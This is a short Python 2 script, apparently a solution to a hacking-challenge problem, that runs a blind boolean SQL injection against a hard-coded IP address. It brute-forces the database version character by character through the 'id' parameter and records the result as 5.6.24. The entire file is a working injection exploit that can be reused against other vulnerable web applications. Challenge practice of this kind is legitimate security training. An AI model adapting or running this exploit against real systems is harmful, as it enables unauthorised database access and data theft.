# -*- coding: cp949 -*-
import urllib
import httplib
import hashlib

key=str()
for i in range(1,20):
    for a in range(1,127):
        HTTP=httplib.HTTPConnection("61.38.179.143")
        Param=urllib.urlencode({})
        Headers={}
        HTTP.request("GET","/problem3/index.php?id=guest%27%20and%20ascii(substr(@@version,"+str(i)+",1))="+str(a)+"%23&pw=guest",Param,Headers)
        Result=HTTP.getresponse().read()
        if "2 - guest - guest" in Result:
            key+=chr(a)
            print key
            break
        #print Result
print key
# version is 5.6.24
